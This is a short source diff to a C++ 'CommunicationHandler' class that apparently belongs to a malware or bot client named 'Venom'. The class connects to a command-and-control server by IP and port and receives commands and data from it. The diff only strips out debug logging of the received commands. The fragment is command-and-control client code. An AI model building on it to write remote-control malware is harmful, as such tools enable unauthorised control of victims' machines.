@@ -1,7 +1,5 @@
 #include "CommunicationHandler.h"
 
-#define LOG(str) std::cout << str << std::endl
-
 CommunicationHandler::Communicator::Communicator(std::string cncIp, int cncPort)
 {
 	cncInformation.sin_family = AF_INET;
@@ -56,8 +54,6 @@ bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command* rec
 		{
 			recv(connectionSocket, commandType, sizeof(int), 0);
 			recievedCommand->commandType = (int)*commandType;
-			LOG("This is commandType:\n");
-			LOG(recievedCommand->commandType);
 		}
 		
 		// Get the actual data.
@@ -65,8 +61,6 @@ bool CommunicationHandler::Communicator::pullCommand(VenomCommands::Command* rec
 		if (recievedCommand->data != NULL)
 		{
 			recv(connectionSocket, recievedCommand->data, recievedCommand->size + 1, 0);
-			LOG("This is DATA:\n");
-			LOG(recievedCommand->data);
 		}
 	}
 
